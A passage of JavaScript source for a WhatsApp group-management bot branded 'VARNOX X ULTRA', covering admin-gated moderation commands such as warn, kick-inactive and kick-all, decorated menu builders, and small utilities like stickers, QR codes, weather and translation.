      await reply('🔊 Group unmuted. Everyone can send messages.');
      break;
    }

    case 'lock': {
      if (needGroup()) break;
      await sock.groupSettingUpdate(jid, 'locked');
      await reply('🔒 Group info locked to admins.');
      break;
    }

    case 'unlock': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'unlocked');
      await reply('🔓 Group info open to all.');
      break;
    }

    case 'tagall':
case 'everyone': {
  if (needGroup()) break;  // fixed the syntax error (removed extra || )
  const list = participants.map((p, i) => {
    const name = p.name || p.pushname || p.notify || p.id || p.jid;
    return `${i+1}. @${normNum(p.id || p.jid)} (${name})`;
  }).join('\n');
  const txt = text || '📢 Attention everyone!\n\nMembers list:';
  const mentions = participants.map(p => p.id || p.jid).filter(Boolean);
  await sock.sendMessage(jid, {
    text: `${txt}\n${list}`,
    mentions
  }, { quoted: qchanel });
  break;
}

case 'tagadmins':
case 'admins': {
  if (needGroup()) break;
  if (!groupAdmins.length) { await reply('No admins found.'); break; }
  const list = groupAdmins.map((admin, i) => {
    // Try to get admin's name from participants array if available
    const p = participants.find(m => (m.id || m.jid) === admin);
    const name = p?.name || p?.pushname || p?.notify || admin;
    return `${i+1}. @${normNum(admin)} (${name})`;
  }).join('\n');
  const txt = text || '📢 Admins!\n\nAdmin list:';
  await sock.sendMessage(jid, {
    text: `${txt}\n${list}`,
    mentions: groupAdmins
  }, { quoted: qchanel });
  break;
}
case 'samsung':
case 'blacklord':
case 'menu3': {
  try {
    await reaction('🌹');

    // ── Build the full command list ──
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';
    const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
    const up = formatUptime(Date.now() - global.botStartTime);
    const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);

    let menuText = `
•━═ 〘  _*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_   〙═━• 

╭═━⪩ 〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐
│⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗔𝗜: ${botName} 🟢
│⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: ${settings.VERSION || '1.0.0'}
│⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}
│⫹⫺ 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗜𝗠𝗘: ${up}
│⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${total}
│⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}
│⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗡𝗘𝗧𝗪𝗢𝗥𝗞: ${settings.COMPANY || 'N/A'}
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n\n`;

    menuText += ` •━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〙•━•⩵꙰ཱི࿐\n\n`;

    for (const [cat, list] of Object.entries(CMDS)) {
      if (!list || list.length === 0) continue;
      menuText += `> ╭═━⪩ 〖  ${cat.toUpperCase()}  〗═══━•⩵꙰ཱི࿐\n`;
      list.forEach(cmd => {
        menuText += `> │❍ ${cmd}\n`;
      });
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    // ── Add plugin commands if any ──
    if (pluginNames.length > 0) {
      menuText += `> ╭═━⪩ 〖  BLACKLORD CHAMBER  〗═══━•⩵꙰ཱི࿐\n`;
      for (const pn of pluginNames) {
        menuText += `> │❍ ${pn}\n`;
      }
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    // ── WhatsApp body limit ≈ 4000 characters ──
    const MAX_BODY_LEN = 4000;
    if (menuText.length > MAX_BODY_LEN) {
      menuText = menuText.slice(0, MAX_BODY_LEN) + '\n... (truncated)';
    }

    // ── Prepare header image (if set) ──
    const imgUrl = getRotatingMenuImage(c.menuImg || settings.DEFAULT_MENU_IMG);
    let headerImage = null;
    if (imgUrl) {
      try {
        let imgBuf = null;
        if (imgUrl.startsWith('data:')) {
          const b64 = imgUrl.split(',')[1];
          if (b64) imgBuf = Buffer.from(b64, 'base64');
        } else if (imgUrl.startsWith('http')) {
          const res = await axios.get(imgUrl, { responseType: 'arraybuffer', timeout: 12000 });
          imgBuf = Buffer.from(res.data);
        } else {
          imgBuf = fs.readFileSync(imgUrl);
        }
        if (imgBuf && imgBuf.length > 200) {
          headerImage = { image: imgBuf };
        }
      } catch (e) {
        console.error('Menu image load error:', e.message);
      }
    }

    // ── Send interactive message with ONLY the Copy Prefix button ──
    const interactiveMessage = {
      header: {
        title: botName,
        subtitle: settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects',
        ...(headerImage ? headerImage : { hasMediaAttachment: false }),
      },
      body: {
        text: menuText,
      },
      footer: {
        text: `© ${settings.CREDITS || 'james'} • ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: 'cta_copy',
            buttonParamsJson: JSON.stringify({
              display_text: `📋 Copy Prefix: ${prefix}`,
              id: 'copy_prefix',
              copy_code: prefix,
            }),
          },
        ],
        messageParamsJson: JSON.stringify({}),
      },
    };

    await sock.sendMessage(jid, {
      interactiveMessage: interactiveMessage,
    }, { quoted: m });

    break;
  } catch (err) {
    console.error('Interactive menu failed:', err);
    // ── Fallback: plain text menu ──
    const fallbackText = menuText || '❌ Menu error – please try again later.';
    await sock.sendMessage(jid, { text: fallbackText + '\n\n_Interactive button unavailable._' }, { quoted: m });
  }
  break;
}
    case 'grouplink':
    case 'invitelink': {
      if (needGroup() || needAdmin()) break;
      const code = await sock.groupInviteCode(jid);
      await reply(`🔗 https://chat.whatsapp.com/${code}`);
      break;
    }

    case 'revoke': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await sock.groupRevokeInvite(jid);
      await reply('✅ Invite link revoked. Old link no longer works.');
      break;
    }

    case 'groupinfo': {
      if (needGroup()) break;
      const adminNames = participants
        .filter(p => p.admin)
        .map(p => p.full?.notify || p.full?.name || `+${normNum(p.jid || p.id)}`)
        .join(', ') || 'None';
      await reply(
        `📋 *${groupName}*\n\nDescription: ${groupMetadata.desc || 'None'}\nMembers: ${participants.length}\nAdmins: ${adminNames}\nOwner: +${normNum(groupOwner)}\nCreated: ${new Date((groupMetadata.creation||0)*1000).toLocaleString()}`
      );
      break;
    }

    case 'members': {
      if (needGroup()) break;
      const list = participants.map((p,i) => `${i+1}. +${normNum(p.jid||p.id)} ${p.admin === 'superadmin' ? '👑' : p.admin ? '🛡' : ''}`).join('\n');
      await reply(`👥 *Members (${participants.length})*\n\n${list}`);
      break;
    }

    case 'setgname': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const name = args.join(' '); if (!name) { await reply(`${prefix}setgname <name>`); break; }
      await sock.groupUpdateSubject(jid, name);
      await reply(`✅ Group name → ${name}`);
      break;
    }

    case 'setgdesc': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const desc = args.join(' '); if (!desc) { await reply(`${prefix}setgdesc <description>`); break; }
      await sock.groupUpdateDescription(jid, desc);
      await reply('✅ Description updated.');
      break;
    }

    case 'hidetag': {
      if (needGroup() || needAdmin()) break;
      const mentions2 = participants.map(p => p.id || p.jid).filter(Boolean);
      await sock.sendMessage(jid, { text: text || ' ', mentions: mentions2 });
      break;
    }

    case 'warn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      const key2  = `${jid}|${normNum(t)}`;
      data[key2]  = (data[key2] || 0) + 1;
      writeJSON(wFile, data);
      const count = data[key2];
      let extra = '';
      if (count >= 3) {
        extra = '\n⛔ *3 warnings reached! Kicking...*';
        try { await sock.groupParticipantsUpdate(jid, [t], 'remove'); } catch {}
        delete data[key2];
        writeJSON(wFile, data);
      }
      await reply(`⚠️ @${normNum(t)} warned (${Math.min(count,3)}/3).${extra}`);
      break;
    }

    case 'resetwarn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      delete data[`${jid}|${normNum(t)}`];
      writeJSON(wFile, data);
      await reply(`✅ @${normNum(t)} warnings reset.`);
      break;
    }

    case 'warnings': {
      if (needGroup()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const count = (readJSON(DB('warnings.json'), {})[`${jid}|${normNum(t)}`] || 0);
      await reply(`⚠️ @${normNum(t)} has ${count}/3 warnings.`);
      break;
    }

    case 'antilink': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antilink on/off`); break; }
      setGroupFlag('antilink.json', jid, v === 'on');
      await reply(`✅ AntiLink → ${v}`);
      break;
    }

    case 'antimedia': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antimedia on/off`); break; }
      setGroupFlag('antimedia.json', jid, v === 'on');
      await reply(`✅ AntiMedia → ${v}`);
      break;
    }

    case 'welcome': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}welcome on/off`); break; }
      setGroupFlag('welcome.json', jid, v === 'on');
      await reply(`✅ Welcome messages → ${v}`);
      break;
    }

    case 'goodbye': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}goodbye on/off`); break; }
      setGroupFlag('goodbye.json', jid, v === 'on');
      await reply(`✅ Goodbye messages → ${v}`);
      break;
    }

    case 'listgroups': {
      if (needOwner()) break;
      try {
        const groups = await sock.groupFetchAllParticipating();
        const list   = Object.values(groups).map((g,i) => `${i+1}. ${g.subject} (${g.participants?.length||0} members)`).join('\n');
        await reply(`📋 *Groups (${Object.keys(groups).length})*\n\n${list || 'None'}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'friends': {
      try {
        const contacts = await sock.getContacts?.() || [];
        const dms = contacts.filter(c2 => c2.id?.endsWith('@s.whatsapp.net')).slice(0, 50);
        if (!dms.length) { await reply('No contacts found.'); break; }
        const list = dms.map((c2, i) => `${i+1}. ${c2.name || c2.notify || `+${normNum(c2.id)}`}`).join('\n');
        await reply(`👥 *Friends/Contacts (${dms.length})*\n\n${list}`);
      } catch { await reply('❌ Could not fetch contacts.'); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   GROUP – NEW COMMANDS
    // ══════════════════════════════════════════════════════

    // Approve all join requests
    case 'approveall': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await reaction('✅');
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const jids = pending.map(p => p.jid);
        await sock.groupRequestParticipantsUpdate(jid, jids, 'approve');
        await reply(`✅ Approved *${jids.length}* pending request(s).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Check pending join requests
    case 'checkpending': {
      if (needGroup() || needAdmin()) break;
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const list = pending.map((p, i) => `${i+1}. +${normNum(p.jid)}`).join('\n');
        await reply(`📋 *Pending Requests (${pending.length})*\n\n${list}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Reject all join requests
    case 'rejectall': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await reaction('❌');
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const jids = pending.map(p => p.jid);
        await sock.groupRequestParticipantsUpdate(jid, jids, 'reject');
        await reply(`🚫 Rejected *${jids.length}* pending request(s).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Disapprove / remove member
    case 'disap': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      let tRaw = getTargetJid(m, args);
      // also accept raw number in args
      if (!tRaw && args[0]) {
        const cleaned = args[0].replace(/[^0-9]/g, '');
        if (cleaned.length >= 7) tRaw = cleaned + '@s.whatsapp.net';
      }
      if (!tRaw) { await reply(`❌ Reply to a member or: ${prefix}disap <number>`); break; }
      // normalise to full JID for admin check
      const tFull = tRaw.includes('@') ? tRaw : normNum(tRaw) + '@s.whatsapp.net';
      const adminNorms = groupAdmins.map(a => (a.includes('@') ? a : a + '@s.whatsapp.net'));
      if (adminNorms.includes(tFull)) { await reply('❌ Cannot remove an admin.'); break; }
      try {
        await sock.groupParticipantsUpdate(jid, [tFull], 'remove');
        await reply(`🚫 @${normNum(tFull)} has been disapproved and removed.`);
      } catch (e) { await reply('❌ disap failed: ' + e.message); }
      break;
    }

    // Anti-mention (protect members from mass mentions / mention spam)
    case 'antimention': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antimention on/off`); break; }
      setGroupFlag('antimention.json', jid, v === 'on');
      await reply(`✅ AntiMention → ${v}\n_Members who mass-mention will be warned._`);
      break;
    }

    // Anti-spam (too many messages in short time → warn/kick)
    case 'antispam': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antispam on/off`); break; }
      setGroupFlag('antispam.json', jid, v === 'on');
      await reply(`✅ AntiSpam → ${v}\n_Members sending >5 msgs in 5s will be warned._`);
      break;
    }

    // Anti-bot (blocks other bot commands from non-owners)
    case 'antibot': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antibot on/off`); break; }
      setGroupFlag('antibot.json', jid, v === 'on');
      await reply(`✅ AntiBot → ${v}\n_Bot commands from non-admin members will be deleted._`);
      break;
    }

    // Slow mode – set message cooldown
    case 'slowmode': {
      if (needGroup() || needAdmin()) break;
      const secs = parseInt(args[0]);
      if (!args[0] || args[0] === 'off') {
        const sm = readJSON(DB('slowmode.json'), {});
        delete sm[jid];
        writeJSON(DB('slowmode.json'), sm);
        await reply('✅ Slow mode disabled.');
        break;
      }
      if (isNaN(secs) || secs < 1 || secs > 3600) { await reply(`${prefix}slowmode <seconds 1-3600> | off`); break; }
      const sm = readJSON(DB('slowmode.json'), {});
      sm[jid] = secs;
      writeJSON(DB('slowmode.json'), sm);
      await reply(`⏱ Slow mode → *${secs}s* between messages per member.`);
      break;
    }
    case 'samsung':
case 'blacklord':
case 'menu9': {
  try {
    console.log('✅ Menu command triggered');
    await reaction('🌹');

    // Use the correct JID
    const chatId = m.key.remoteJid || m.chat || m.sender;
    console.log('📌 Using JID:', chatId);

    // ── 1. Send a simple text message to confirm it works ──
    await sock.sendMessage(chatId, { text: '✅ Command received' });

    // ── 2. Build minimal menu ──
    const up = formatUptime(Date.now() - global.botStartTime);
    const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
    const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

    let menuText = `*${botName}* Menu\n\n`;
    menuText += `Uptime: ${up}\n`;
    menuText += `Commands: ${total}\n`;
    menuText += `Prefix: ${prefix}\n\n`;
    menuText += `Use *${prefix}allmenu* to see all commands.`;

    // ── 3. Image URL ──
    const thumbnail = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://via.placeholder.com/800x400/1a1a2e/FFFFFF?text=VARNOX+ULTRA';

    // ── 4. Send image with caption ──
    await sock.sendMessage(chatId, {
      image: { url: thumbnail },
      caption: menuText
    });

    console.log('✅ Menu sent successfully');

  } catch (err) {
    console.error('❌ Menu crash:', err);
    // Optionally send error to chat if JID is valid
    const chatId = m.key?.remoteJid || m.chat;
    if (chatId) {
      try {
        await sock.sendMessage(chatId, { text: '❌ Error: ' + err.message });
      } catch (e) {
        // ignore
      }
    }
  }
  break;
}
    // Soft-ban: mute a specific member (remove then re-add – they can't send until re-added)
    case 'softban': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      if (groupAdmins.includes(t)) { await reply('❌ Cannot soft-ban an admin.'); break; }
      try {
        await sock.groupParticipantsUpdate(jid, [t], 'remove');
        await new Promise(r => setTimeout(r, 2000));
        await sock.groupParticipantsUpdate(jid, [t], 'add');
        await reply(`🔇 @${normNum(t)} soft-banned (removed & re-added, messages reset).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Kick all non-admins
    case 'kickall': {
    if (needGroup()) break;
    if (!_isOwner) {
        await reply('❌ Owner only.');
        break;
    }

    const nonAdmins = participants
        .filter(p => !p.admin)
        .map(p => p.id || p.jid)
        .filter(Boolean);

    if (!nonAdmins.length) {
        await reply('❌ No non-admin members found.');
        break;
    }

    await reply(`⚠️ Removing ${nonAdmins.length} non-admin members...`);

    let removed = 0;
    let failed = 0;

    const chunkSize = 1030;

    for (let i = 0; i < nonAdmins.length; i += chunkSize) {
        const chunk = nonAdmins.slice(i, i + chunkSize);

        try {
            await sock.groupParticipantsUpdate(
                jid,
                chunk,
                "remove"
            );

            removed += chunk.length;
        } catch (err) {
            failed += chunk.length;
        }

        // Anti-spam delay
        await new Promise(resolve => setTimeout(resolve, 1500));
    }

    await reply(`✅ 🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐊𝐈𝐂𝐊 𝐀𝐋𝐋⌟ ◆
│
├◆ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: ${removed}
├◆ 𝐅𝐚𝐢𝐥𝐞𝐝: ${failed}
├◆ 𝐍𝐨𝐭𝐞: 𝐀𝐝𝐦𝐢𝐧𝐬 𝐰𝐞𝐫𝐞 𝐤𝐞𝐩𝐭
└ ❏`);

    break;
}
case 'unlock': {
    if (needGroup() || needAdmin()) break;
    await sock.groupSettingUpdate(jid, 'unlocked');
    const replyText = `🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐔𝐍𝐋𝐎𝐂𝐊 𝐆𝐑𝐎𝐔𝐏⌟ ◆
│
├◆ 𝐒𝐓𝐀𝐓𝐔𝐒: 🔓 𝐆𝐫𝐨𝐮𝐩 𝐢𝐧𝐟𝐨 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝
├◆ 𝐍𝐎𝐓𝐄: 𝐀𝐥𝐥 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐜𝐚𝐧 𝐞𝐝𝐢𝐭
└ ❏

⏤͟͟͞🩸`;
    await reply(replyText);
    break;
}

    // Set custom welcome message
    case 'setwelcomemsg': {
      if (needGroup() || needAdmin()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}setwelcomemsg <message>\nUse {name} for member name, {group} for group name.`); break; }
      const wm = readJSON(DB('welcomemsgs.json'), {});
      wm[jid] = msg;
      writeJSON(DB('welcomemsgs.json'), wm);
      await reply(`✅ Welcome message set:\n${msg}`);
      break;
    }

    // Set custom goodbye message
    case 'setgoodbyemsg': {
      if (needGroup() || needAdmin()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}setgoodbyemsg <message>\nUse {name} for member name, {group} for group name.`); break; }
      const gm = readJSON(DB('goodbyemsgs.json'), {});
      gm[jid] = msg;
      writeJSON(DB('goodbyemsgs.json'), gm);
      await reply(`✅ Goodbye message set:\n${msg}`);
      break;
    }

    // Mute list – see who has been muted via softban
    case 'mutelist': {
      if (needGroup() || needAdmin()) break;
      const ml = readJSON(DB('mutedmembers.json'), {});
      const list2 = (ml[jid] || []);
      if (!list2.length) { await reply('No muted members.'); break; }
      await reply(`🔇 *Muted Members (${list2.length})*\n${list2.map((j2,i) => `${i+1}. +${normNum(j2)}`).join('\n')}`);
      break;
    }

    // Kick inactive members (no messages in X days tracked via DB)
    case 'kickinactive': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      if (!_isOwner) { await reply('❌ Owner only.'); break; }
      const days = parseInt(args[0]) || 7;
      const actFile = DB('activity.json');
      const act = readJSON(actFile, {});
      const cutoff = Date.now() - days * 86400000;
      const inactive = participants
        .filter(p => !p.admin)
        .map(p => p.jid || p.id)
        .filter(pjid => {
          const key3 = `${jid}|${normNum(pjid)}`;
          return !act[key3] || act[key3] < cutoff;
        });
      if (!inactive.length) { await reply(`✅ No inactive members (>${days} days) found.`); break; }
      await reply(`⚠️ Kicking *${inactive.length}* members inactive for >${days} days...`);
      let done2 = 0;
      for (const t of inactive) {
        try { await sock.groupParticipantsUpdate(jid, [t], 'remove'); done2++; await new Promise(r => setTimeout(r, 500)); } catch {}
      }
      await reply(`✅ Kicked *${done2}* inactive members.`);
      break;
    }
case 'samsung':
case 'blacklord':
case 'menu10': {
  try {
    console.log('✅ Menu command triggered');
    await reaction('🌹');

    const chatId = m.key.remoteJid || m.chat || m.sender;
    console.log('📌 Sending menu to:', chatId);

    // ── Gather data ──
    const { date, time } = getDateTime();
    const up = formatUptime(Date.now() - global.botStartTime);
    const total = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
    const botName = c.botName || settings.BOT_NAME || '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_';
    const prefix = c.prefix || settings.DEFAULT_PREFIX || '.';

    // ── Build full menu text ──
    let menuText = `
•━═ 〘  _*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_   〙═━• 

> ╭═━⪩〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐
> │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗔𝗜: ${botName} 🟢
> │⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: ${settings.VERSION || '1.0.0'}
> │⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}
> │⫹⫺ 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗜𝗠𝗘: ${up}
> │⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${total}
> │⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}
> │⫹⫺ 𝗚𝗔𝗟𝗔𝗫𝗬 𝗡𝗘𝗧𝗪𝗢𝗥𝗞: ${settings.COMPANY || 'N/A'}
> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐

•━══〘 𝐎𝐅𝐅𝐂 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〙•━•⩵꙰ཱི࿐
`;
    for (const [cat, list] of Object.entries(CMDS)) {
      if (!list || list.length === 0) continue;
      menuText += `> ╭═━⪩ 〖  ${cat.toUpperCase()}  〗═══━•⩵꙰ཱི࿐\n`;
      list.forEach(cmd => { menuText += `> │❍ ${cmd}\n`; });
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }
    if (pluginNames.length > 0) {
      menuText += `> ╭═━⪩ 〖  BLACKLORD CHAMBER  〗═══━•⩵꙰ཱི࿐\n`;
      for (const pn of pluginNames) menuText += `> │❍ ${pn}\n`;
      menuText += `> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐\n\n`;
    }

    // ── Image URL ──
    const thumbnail = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://via.placeholder.com/800x400/1a1a2e/FFFFFF?text=VARNOX+ULTRA';

    // ─── 1st Message: Image + Caption ─────────────────────────────
    await sock.sendMessage(chatId, {
      image: { url: thumbnail },
      caption: menuText
    });
    console.log('✅ Image + caption sent');

    // ─── 2nd Message: Blacklord Buttons menu ─────────────────────
    // The helper is loaded lazily because this bot uses CommonJS while
    // blacklord-btns is an auditable ESM package.
    const { sendButtons, btn } = await getBlacklordButtons();
    const buttonSections = [
      {
        title: 'Main menu',
        rows: [
          { title: 'All commands', description: `Show every ${botName} command`, id: `${prefix}allmenu` },
          { title: 'Owner commands', description: 'Owner-only commands', id: `${prefix}owner` },
          { title: 'Script information', description: 'Bot source information', id: `${prefix}sc` }
        ]
      },
      {
        title: 'Command categories',
        rows: Object.keys(CMDS).slice(0, 25).map(category => ({
          title: `${category.toUpperCase()} menu`,
          description: `Open ${category} commands`,
          id: `${prefix}menu${category.toLowerCase()}`
        }))
      }
    ];
    await sendButtons(sock, chatId, {
      text: '📋 *Choose a VARNOX menu*',
      title: 'VARNOX X ULTRA',
      subtitle: `${total} commands available`,
      footer: botName,
      buttons: [
        btn.reply('All commands', `${prefix}allmenu`),
        btn.reply('owner menu', `${prefix}ownermenu`),
        btn.list('Browse categories', buttonSections)
      ]
    });
    console.log('✅ Blacklord Buttons menu sent');

  } catch (err) {
    console.error('❌ Menu crash:', err);
    // Fallback: send a plain text list
    try {
      const chatId = m.key.remoteJid || m.chat;
      if (chatId) {
        await sock.sendMessage(chatId, {
          text: '❌ Interactive menu failed. Please use .allmenu to see all commands.'
        });
      }
    } catch (e) {
      console.error('Fallback also failed:', e);
    }
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   UTILITY – EXISTING
    // ══════════════════════════════════════════════════════

    case 'sticker': {
      await reaction('🎨');
      const { qMsg, qType, qKey } = getQuoted(m);
      const imgMsg = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
      const vidMsg = m.message?.videoMessage  || (qType === 'videoMessage' ? qMsg?.videoMessage  : null);
      const stickerSrc = imgMsg ? { imageMessage: imgMsg } : vidMsg ? { videoMessage: vidMsg } : null;
      const stickerKey = imgMsg
        ? (m.message?.imageMessage ? m.key : qKey)
        : m.message?.videoMessage ? m.key : qKey;
      if (!stickerSrc) { await reply(`Reply to an image or video with ${prefix}sticker`); break; }
      try {
        const buf = await dlMedia(stickerSrc, stickerKey);
        const tmp = `/tmp/stk_${Date.now()}`;
        fs.writeFileSync(`${tmp}.in`, buf);
        await new Promise((res, rej) =>
          exec(`ffmpeg -y -i ${tmp}.in -vf "scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2" -loop 0 ${tmp}.webp 2>/dev/null`, e => e ? rej(e) : res())
        );
        const webp = fs.readFileSync(`${tmp}.webp`);
        await sock.sendMessage(jid, { sticker: webp }, { quoted: qchanel });
        try { fs.unlinkSync(`${tmp}.in`); fs.unlinkSync(`${tmp}.webp`); } catch {}
      } catch { await reply('❌ Sticker failed. Make sure ffmpeg is installed.'); }
      break;
    }

    case 'toimg': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const sm = m.message?.stickerMessage || (qType === 'stickerMessage' ? qMsg?.stickerMessage : null);
      if (!sm) { await reply('Reply to a sticker.'); break; }
      const srcKey = m.message?.stickerMessage ? m.key : qKey;
      try {
        const buf = await dlMedia({ stickerMessage: sm }, srcKey);
        await replyImg(buf, '🖼 Sticker → Image');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    
    case 'qr': {
      if (!text) { await reply(`${prefix}qr <text>`); break; }
      await replyImg(`https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(text)}`, `🔲 QR: ${text}`);
      break;
    }

    case 'weather': {
      const city = text; if (!city) { await reply(`${prefix}weather <city>`); break; }
      try {
        const r = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=4&m`, { timeout: 8000 });
        await reply(`🌤 *${city}*\n${r.data}`);
      } catch { await reply('❌ Weather fetch failed.'); }
      break;
    }

    case 'tr': {
      const lang = args[0]; const txt2 = args.slice(1).join(' ');
      if (!lang || !txt2) { await reply(`${prefix}tr <lang> <text>\nExample: ${prefix}tr es Hello World`); break; }
      try {
        const r = await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(txt2)}&langpair=en|${lang}`, { timeout: 8000 });
        await reply(`🌐 (${lang}) ${r.data.responseData.translatedText}`);
      } catch { await reply('❌ Translation failed.'); }
      break;
    }

    case 'uploadstatus': {
      if (needOwner()) break;
      const { qMsg, qType, qKey } = getQuoted(m);
      try {
        if (qType === 'imageMessage') {
          const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
          await sock.sendMessage('status@broadcast', { image: buf, caption: qMsg.imageMessage?.caption || '' });
        } else if (qType === 'videoMessage') {
          const buf = await dlMedia({ videoMessage: qMsg.videoMessage }, qKey);
          await sock.sendMessage('status@broadcast', { video: buf, caption: qMsg.videoMessage?.caption || '' });
        } else {
          const t2 = text || qMsg?.conversation || qMsg?.extendedTextMessage?.text || '';
          if (!t2) { await reply('Provide text or reply to media.'); break; }
          await sock.sendMessage('status@broadcast', { text: t2 }, { backgroundColor: '#128C7E', font: 3 });
        }
        await reply('✅ Status uploaded.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

